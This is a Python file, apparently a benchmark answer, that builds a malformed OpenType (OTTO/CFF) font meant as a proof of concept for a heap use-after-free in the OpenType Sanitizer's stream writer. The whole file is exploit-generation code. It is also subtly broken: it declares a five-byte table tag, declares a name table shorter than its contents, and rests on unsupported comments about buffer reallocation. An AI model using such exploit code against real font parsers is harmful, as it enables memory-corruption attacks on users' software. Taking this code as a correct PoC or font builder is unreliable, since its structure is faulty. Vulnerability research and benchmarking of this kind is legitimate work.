import os
import tempfile
import subprocess
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC is designed to trigger a heap use-after-free in ots::OTSStream::Write
        # The vulnerability occurs when the stream buffer is reallocated and the old
        # buffer is used after being freed
        
        # Create a minimal OTF font structure that will trigger the bug
        # The font needs to have table data that causes buffer reallocation
        
        # We'll create a font with multiple tables, where one table triggers
        # buffer growth during writing
        
        # Build a minimal valid OTF font structure
        
        # 1. SFNT version (OTTO for CFF)
        data = b'OTTO\x00\x00\x00\x00'
        
        # 2. Number of tables - we need at least 2 to trigger reallocation
        num_tables = 3
        data += struct.pack('>H', num_tables)
        
        # 3. Search range, entry selector, range shift
        search_range = 2 * (1 << (num_tables.bit_length() - 1))
        entry_selector = (num_tables.bit_length() - 1)
        range_shift = 2 * num_tables - search_range
        data += struct.pack('>HHH', search_range, entry_selector, range_shift)
        
        # Calculate offsets for tables
        offset = 12 + 16 * num_tables  # Header size
        
        # Table 1: CFF table (required for OTTO)
        tag1 = b'CFF '
        checksum1 = 0
        offset1 = offset
        length1 = 100  # Will be filled later
        
        # Table 2: name table (triggers reallocation)
        tag2 = b'name'
        checksum2 = 0
        offset2 = offset1 + length1
        length2 = 200
        
        # Table 3: dummy table
        tag3 = b'dummy'
        checksum3 = 0
        offset3 = offset2 + length2
        length3 = 500  # This causes the buffer to grow
        
        # Write table directory entries
        data += tag1 + struct.pack('>III', checksum1, offset1, length1)
        data += tag2 + struct.pack('>III', checksum2, offset2, length2)
        data += tag3 + struct.pack('>III', checksum3, offset3, length3)
        
        # Pad to offset1
        data += b'\x00' * (offset1 - len(data))
        
        # CFF table data (minimal)
        cff_data = b'\x01\x00\x04\x01'  # Header
        cff_data += b'\x00' * 96  # Pad to 100 bytes
        data += cff_data
        
        # name table (will trigger reallocation)
        # This table needs to be complex enough to cause buffer growth
        name_data = b'\x00\x00'  # Format 0
        name_data += struct.pack('>H', 3)  # Count
        
        # String storage offset
        storage_offset = 6 + 3 * 12
        name_data += struct.pack('>H', storage_offset)
        
        # Add name records that will be written
        for i in range(3):
            platform_id = 3  # Microsoft
            encoding_id = 1  # Unicode BMP
            language_id = 0x0409  # English
            name_id = i
            length = 50 + i * 50  # Increasing lengths
            offset = i * 100
            name_data += struct.pack('>HHHHHH', 
                                   platform_id, encoding_id, language_id,
                                   name_id, length, offset)
        
        # String storage (will be written later causing reallocation)
        name_data += b'A' * 300  # Large enough to trigger reallocation
        
        data += name_data
        
        # Pad to offset3
        current_len = len(data)
        pad_needed = offset3 - current_len
        if pad_needed > 0:
            data += b'\x00' * pad_needed
        
        # dummy table - this is what triggers the use-after-free
        # The table data contains values that will cause OTS to allocate
        # a buffer, then reallocate it, but continue using the old buffer
        
        # Create data that looks like a simple table but will trigger
        # the vulnerable code path in OTSStream::Write
        
        # The vulnerability occurs when writing data that causes the buffer
        # to grow, but the old buffer pointer is still used
        
        # We need to create a scenario where:
        # 1. Initial buffer allocation happens
        # 2. Buffer needs to grow (realloc)
        # 3. Old buffer is freed but still accessed
        
        # The exact trigger is writing data that exceeds the current capacity
        # during the processing of this table
        
        # Create pattern that will be parsed and trigger multiple writes
        # with growing sizes
        
        dummy_data = b'DUMM'  # Table type identifier
        
        # Add a structure that will be parsed and cause repeated writes
        # with increasing sizes
        
        # First, a count of items
        dummy_data += struct.pack('>H', 100)
        
        # Then items with offsets that will trigger buffer growth
        for i in range(100):
            # Each item has an offset that points to growing data sections
            offset = 4 + 2 + 100 * 4 + i * 10  # Base + count + offsets + previous items
            dummy_data += struct.pack('>I', offset)
        
        # Now add the actual data that will be written
        # This data needs to cause OTSStream::Write to reallocate
        for i in range(100):
            # Varying sized data chunks
            size = 10 + (i % 5) * 20
            chunk = bytes([(i + j) % 256 for j in range(size)])
            dummy_data += chunk
        
        # Ensure total length matches
        if len(dummy_data) < length3:
            dummy_data += b'\x00' * (length3 - len(dummy_data))
        else:
            dummy_data = dummy_data[:length3]
        
        data += dummy_data
        
        # Now we need to update checksums
        # Calculate checksum for entire font
        # But first, let's make sure the structure is valid enough
        # to pass initial validation
        
        # Update offsets in header if needed
        data_array = bytearray(data)
        
        # Final size should be around 800 bytes
        # Trim or pad to exactly 800 bytes
        if len(data_array) < 800:
            data_array += b'\x00' * (800 - len(data_array))
        else:
            data_array = data_array[:800]
        
        return bytes(data_array)